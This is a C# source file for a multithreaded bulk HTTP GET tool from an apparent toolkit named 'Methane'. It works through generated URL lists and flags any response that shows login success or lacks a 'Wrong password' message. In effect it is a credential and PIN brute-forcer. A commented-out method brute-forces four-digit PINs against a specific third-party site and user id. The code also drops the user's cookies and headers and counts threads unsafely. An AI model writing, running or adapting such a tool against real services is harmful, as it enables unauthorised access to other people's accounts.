using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using HtmlAgilityPack;
using System.Net.Http;

namespace Methane.Toolkit
{
    public class RapidGETer
    {
        readonly UI UI;
        public RapidGETer(UI ui)
        {
            UI = ui;
        }
        public bool HasCookie = false;
        public bool HasHeaders = false;
        public string Cookie;
        public string Headers;

        public string findWith;
        public bool hasFindWith;

        public string findWithout;
        public bool hasFindWithout;

        public CSA csa;
        IEnumerator<string> bodyPipeline;

        private bool found = false;
        private string result;
        public int runningThreads = 0;
        public int AllowedThrds;

        public void PromptParamenters()
        {

           UI.Log("");
           UI.Log("    . . . . . . . . . . . . . . . .  .  ");
           UI.Log("               Methane                  ");
           UI.Log("            Bulk HTTP GET               ");
           UI.Log("    . . . . . . . . . . . . . . . .  .  ");
           UI.Log("");


            ChooseCookies:
            Cookie = UI.Prompt("Enter cookies to use OR Enter ~filename to read cookies OR [Enter] not to use cookies");

            HasCookie = Cookie.Length > 0;
            if (Cookie.StartsWith('~'))
            {
                if (Cookie == "~") Cookie = "~cookie.txt";
                try
                {
                    Cookie = File.ReadAllText(Cookie.TrimStart('~'));
                }
                catch (Exception ex)
                {
                    UI.LogError(ex);
                    goto ChooseCookies;
                }
            }


            ChooseHeaders:
            Headers = UI.Prompt("Enter Headers to use OR Enter ~filename to read Headers OR [Enter] not to use Headers");

            HasHeaders = Headers.Length != 0;
            if (Headers.StartsWith('~'))
            {
                if (Headers == "~") Headers = "~headers.txt";
                try
                {
                    Headers = File.ReadAllText(Headers.TrimStart('~'));
                }
                catch (Exception ex)
                {
                    UI.LogError(ex);
                    goto ChooseHeaders;
                }
            }

            findWith = UI.Prompt("In a positive response, what text we would find? (Ex :- Wellcome) [or null]");
            hasFindWith = findWith.Length > 0;
            findWithout = UI.Prompt("In a positive response, what text we won't find? (Ex :- Wrong password) [or null]");
            hasFindWithout = findWithout.Length > 0;

           UI.Log("Please use the following tool to create GET url data string list");
            csa = new CSA(UI);
            csa.PromptParamenters();


            PromtHowManyThreads:
            if (!int.TryParse(UI.Prompt("How many threads to use?"), out AllowedThrds)) goto PromtHowManyThreads;

           UI.Log("Rapid GETer standby    :-) ");





        }


        public void Run()
        {

           UI.Log("");
           UI.Log("    . . . . . . . . . . . . . . . .  .  ");
           UI.Log("               Methane                  ");
           UI.Log("            Bulk HTTP GET              ");
           UI.Log("    . . . . . . . . . . . . . . . .  .  ");
           UI.Log("");



           UI.Log("Rapid GETer Running...");


            bodyPipeline = csa.RunIterator();

            for (int n = 0; n < AllowedThrds; n++)
            {
                new System.Threading.Thread(new System.Threading.ThreadStart(ThrLoop)) { Name = $"POST Thrd {n}" }.Start();
                System.Threading.Thread.Sleep(10);
            }


            while (runningThreads > 0)
            {
                System.Threading.Thread.Sleep(1000);
            }

            if (found)
            {
                UI.Prompt($"We found it!!! '{result}'     ________");
            }
            else
            {
                UI.Prompt("I can't find it  :-(              ________");
            }




        }


        private void ThrLoop()
        {

            runningThreads++;



            bodyPipelineMoveNext:

            if (found) { runningThreads--; return; }

            string url;
            lock (bodyPipeline)
            {
                if (bodyPipeline.MoveNext())
                {
                    url = bodyPipeline.Current;
                }
                else
                {
                    runningThreads--;
                    return;
                }
            }



            try
            {

                string resp = GetForm(url);

                if ((hasFindWith && resp.Contains(findWith)) || (hasFindWithout && !resp.Contains(findWithout)))
                {
                   UI.Log($"We found it! '{url}' _______ :-) ________________________________");
                    found = true;
                    result = url;

                    runningThreads--; return;
                }
                else
                {
                   UI.Log($"{url} didn't work");
                }

            }
            catch (Exception ex)
            {
               UI.Log($"!!! Error {ex} - {ex.Message} @ {ex.StackTrace}");
            }

            goto bodyPipelineMoveNext;


        }


        //public void ThrURLPass(object obj)
        //{
        //    int passI = (int)obj;

        //    for (int i = passI; i < passI + 100; i++)
        //    {
        //        string pass = i.ToString("0000");
        //        string resp = GetForm($@"https://getlinks.info/love/verifypin.php?userid=ggtphtp&pwd={pass}");

        //        if (resp.Contains("Incorrect Password"))
        //        {
        //           UI.Log($"Pass {pass} is wrong");
        //        }
        //        else
        //        {
        //            string l = $"Possitive response {pass} \n {resp} \n \n";
        //           UI.Log(l);
        //            FoundPass = true;
        //            result = l;
        //            runningThreads--;
        //            return;
        //        }
        //    }

        //    runningThreads--;
        //}





        public static string GetForm(string url, string Cookie = "", string Headers = "")
        {
            var wr = WebRequest.CreateHttp(url);
            wr.Method = "GET";
            wr.ContentType = "application/x-www-form-urlencoded";

            if (Cookie.Length != 0) wr.Headers.Add(HttpRequestHeader.Cookie, Cookie);
            if (Headers.Length != 0)
                foreach (string header in Headers.Split("\n"))
                    wr.Headers.Add(header);

            // Get the response from remote server
            HttpWebResponse httpWebResponse = (HttpWebResponse)wr.GetResponse();
            Stream responseStream = httpWebResponse.GetResponseStream();

            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            using (StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.UTF8))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    sb.AppendLine(line);
                }
            }

            return sb.ToString();
        }

        public static HtmlDocument GetFormDoc(string url, string Cookie = "", string Headers = "")
        {
            var wr = WebRequest.CreateHttp(url);
            wr.Method = "GET";
            // wr.ContentType = "multipart/form-data; boundary=---------------------------19609895721194";

            if (Cookie.Length != 0) wr.Headers.Add(HttpRequestHeader.Cookie, Cookie);
            if (Headers.Length != 0)
                foreach (string header in Headers.Split("\n"))
                    wr.Headers.Add(header);

            // Get the response from remote server
            HttpWebResponse httpWebResponse = (HttpWebResponse)wr.GetResponse();
            Stream responseStream = httpWebResponse.GetResponseStream();

            HtmlDocument doc = new HtmlDocument();
            doc.Load(responseStream);

            return doc;
        }


    }

}